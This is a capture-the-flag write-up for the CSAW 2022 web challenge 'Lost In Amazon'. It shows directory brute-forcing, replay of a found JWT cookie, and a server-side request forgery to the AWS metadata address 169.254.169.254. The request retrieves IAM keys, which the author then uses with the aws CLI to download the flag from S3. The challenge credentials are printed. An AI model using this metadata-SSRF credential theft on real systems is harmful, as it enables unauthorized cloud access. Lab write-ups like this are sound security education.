---
title: "Lost In Amazon"
date: 2022-09-12T14:30:16-04:00
draft: false
authors: ["CDT Daniel Chung"] 
tags: ["csaw", "web"]
---

Absolutely lost in the sauce...

## Description

Let's discover the Amazon forest internally. But from where and how? Also what is the secret?

http://web.chal.csaw.io:5011

## Hint

use [wordlist.txt](https://ctf.csaw.io/files/ded8552e7c4f010ab2d201af8d814747/rockyou.txt) instead

### TL;DR

Dirb the initial website to find a jwt token and a hint at an internal dev website, dirb `/developer/` to find `/developer/heaven/`.
From here, load a cookie of 
```
secret:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzZW5kZXIiOiJzZWNyZXQiLCJtZXNzYWdlIjoiQSB1c2VmdWwgcGllY2Ugb2YgdGhlIHF1ZXN0LiEiLCJkYXRlIjoiMjAyMi0wOS0wOSAyMjo0MzoyMy4xMjg5NzciLCJleHAiOjE2NjI4NDk4MDN9.-9jBPW6b9V9AKkLNO1zcY5_mnbuuz3l2Vqi-NMR0ZM8
``` 
and reload to get the developer page, and use the aws metadata service to retrieve the aws secrets.

### First Steps

Initially I went to `http://web.chal.csaw.io:5011/` and saw this paragraph on the page.

```html
<div id="content-1">
    <div class="featured">
        <h2><a href="#">A History of the Biggest Jock Jam Single of All Time</a></h2>
            <p>WE WILL ROCK YOU tells the story of a globalized future without musical instruments. A handful of rock rebels, the Bohemians, fight against the all-powerful Globalsoft company and its boss, the Killer Queen; they fight for freedom, individuality and the rebirth of the age of rock. Scaramouche and Galileo, two young outsiders, cannot come to terms with the bleak conformist reality. They join the Bohemians and embark on the search to find the unlimited power of freedom, love and Rock!</p>
            <p>The idea for the musical came after a meeting between the actor Robert De Niro with musicians Brian May and Roger Taylor, in Venice in 1996. De Niro's daughter was a big fan of the Queen and the actor asked if the legends of rock had never thought of creating a musical based on their songs. That was the beginning of everything.</p>
    </div>
</div>
```

The paragraph hints at using rockyou.txt, so I started `feroxbuster` to enumerate the subdirectories.
```shell
$ ./feroxbuster -u http://web.chal.csaw.io:5011/ -w rockyou.txt   
```

`feroxbuster` managed to find two pages, `/rockyou` and `/secret`, where `/secret` contains a jwt token. Decoding this with `jwt.io` shows that the token is "secret" but nothing useful for now so let's keep this in mind.

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzZW5kZXIiOiJzZWNyZXQiLCJtZXNzYWdlIjoiQSB1c2VmdWwgcGllY2Ugb2YgdGhlIHF1ZXN0LiEiLCJkYXRlIjoiMjAyMi0wOS0xMCAwNzoxMToyMi4zNTg3NjYiLCJleHAiOjE2NjI4ODAyODJ9.48M1jV5qf60vAU-bnRFwsOL6x5l16MlBttydm-iFzsQ
```
```json
{
  "sender": "secret",
  "message": "A useful piece of the quest.!",
  "date": "2022-09-10 07:11:22.358766",
  "exp": 1662880282
}
```

`/rockyou` contained another webpage, telling us that there was another pathway.

```
There is a hidden pathway to accesss the internal Amazon forest. But it's restricted :( and still in the development phase
```

From here I was stuck for quite a long time figuring out the next path. Admin said that the next root path was something related to development, so I ended up trying `/internal/, /development/, /dev/, /restricted/, /secret/, /notes/, /todo/, /admin/, /progress/` and finally `/developer/` through `feroxbuster`

```
$ ./feroxbuster -u http://web.chal.csaw.io:5011/developer/ -w rockyou.txt   
```

`feroxbuster` ended up finding a path to `/developer/heaven` which landed on a 403 page with a screenshot from a movie, telling us that the moose out back should've told us to stop. Remember the jwt token we found earlier? It finally comes into play here. I made a cookie named `secret` with the value of the token. 

```
secret:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzZW5kZXIiOiJzZWNyZXQiLCJtZXNzYWdlIjoiQSB1c2VmdWwgcGllY2Ugb2YgdGhlIHF1ZXN0LiEiLCJkYXRlIjoiMjAyMi0wOS0wOSAyMjo0MzoyMy4xMjg5NzciLCJleHAiOjE2NjI4NDk4MDN9.-9jBPW6b9V9AKkLNO1zcY5_mnbuuz3l2Vqi-NMR0ZM8
```
After refreshing the page, I found a page looking like a travel website.

```html
<body>
    <div class="s01">
        <form action="/magiccall">
            <fieldset>
            <legend>Discover the internal Amazon Forest</legend>
            </fieldset>
            <div class="inner-form">
            <div class="input-field first-wrap">
                <input name="pathtojwel" id="search" type="text" placeholder="What are you looking for?" />
            </div>
            <div class="input-field second-wrap">
                <input name="location" id="location" type="text" placeholder="location" />
            </div>
            <div class="input-field third-wrap">
                <input class="btn-search" name="magiccall_" value="Search" type="submit"></input>
            </div>
            </div>
        </form>
    </div>
</body>
```

### A Giant Rabbit Hole

From here I thought you had to brute force the possible directories and the possible file locations. This was useless and I ended up wasting 3 hours scripting and trying possibilities.

```py
import requests
import itertools
looking_for = ""
location = ""
base_url = "http://web.chal.csaw.io:5011/magiccall?pathtojwel={looking_for}&location={location}&magiccall_=Search"

base_result = requests.get(base_url).text

extensions = ["", "/","~/", "/.", "~/.", "./", "./.", "../", "../../", "../../../", "../../../../", "../../../../../"]

looking_for_list = ["config","credentials", "internal", "Amazon", "amazon", "forest", "ami-id","AWS_CONFIG_FILE", "AWS_SHARED_CREDENTIALS_FILE", "secret", "creds", "discover", "ecsInstanceRole"]
# location_list = ["lost+found","aws/", "internal/", "amazon/", "forest/", "latest/meta-data/"]
# location_list = ["lost+found/"]
# location_list = ["latest/meta-data/iam/security-credentials/", "latest/user-data/"]
# location_list = ["console/","bucket/"]
# location_list = ["Amazon/", "amazon/", "aws/config/"]
# location_list = ["etc/environment/","aws/environment/", "aws_env/"]
# location_list = [""]
# location_list = ["magiccall/"]
# location_list = ["discover/"]
location_list = [""]

ext_location = []
for pair in itertools.product(extensions, location_list):
    ext_location.append(pair[0] + pair[1])

for pair in itertools.product(looking_for_list, ext_location):
    print(f"trying {pair}")
    r = requests.get(base_url.format(looking_for=pair[0], location=pair[1]))
    if r.text != base_result:
        print("Found it!")
        print(r.text.strip("\n"))
        break
```

### Right Path

I asked an admin to provide insight and `harin` told me to try a completely different location. From here, I tried a bunch of different locations such as `localhost`, `web.chal.csaw.io:5011`, and `8.8.8.8`. Surprise!!!

```
Good Progress!! Keep it up.
I can only make calls to Amazon meta data
```

A quick [google search](https://www.google.com/search?channel=fs&client=ubuntu&q=amazon+meta+data) regarding Amazon meta data led to the [documentation page](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html) for AWS. The page specifies that the IPv4 address of the instance metadata service used for the examples is `169.254.169.254`, so why not try that. [Here](http://web.chal.csaw.io:5011/magiccall?pathtojwel=%2Flatest%2Fmeta-data&location=169.254.169.254&magiccall_=Search) I found a proper response showing a folder named `latest`. Continuing to follow the trail, I found `latest/dynamic` and `latest/meta-data`, with the following link. A little bit of snooping around later, and I found `latest/meta-data/iam/security-credentials/lost-in-amazon` which showed the following information:

```
Good Progress!! Keep it up.
{
"Code": "Success",
"LastUpdated": "2020-04-02T18:50:40Z",
"Type": "AWS-HMAC",
"AccessKeyId": "AKIAWFXGV6SZK7LCJ3MX",
"SecretAccessKey": "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",
"Token": "Private S3 Bucket: csaw",
"Expiration": "2022-04-02T00:49:51Z"
}
```

We now have 3/4 pieces of information required to access an AWS bucket through s3, so let's keep looking around. I found `latest/meta-data/placement/region`, which shows what region the bucket is located in.

```
Good Progress!! Keep it up.
us-east-1
```

And now like Thanos we have all the pieces. Here I configured my aws cli with the information provided, `json` was a guess.

```console
$ aws configure
AWS Access Key ID [None]: AKIAWFXGV6SZK7LCJ3MX
AWS Secret Access Key [None]: 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
Default region name [None]: us-east-1     
Default output format [None]: json
```

Accessing the bucket with aws s3 cli showed that there was a flag inside the bucket.

```console
$ aws s3 ls s3://csaw

2022-09-03 04:21:26         26 flag.txt

$ aws s3 cp s3://csaw/flag.txt ~/

download: s3://csaw/flag.txt to ../../../../../../../flag.txt     
```

### Flag

```
CTF{M3t@_D@TA_1S_CRi7Ic@L}
```

### Notes

- 5th global solve for CSAW 2022 @ 500 points
- Was an extremely guessy challenge
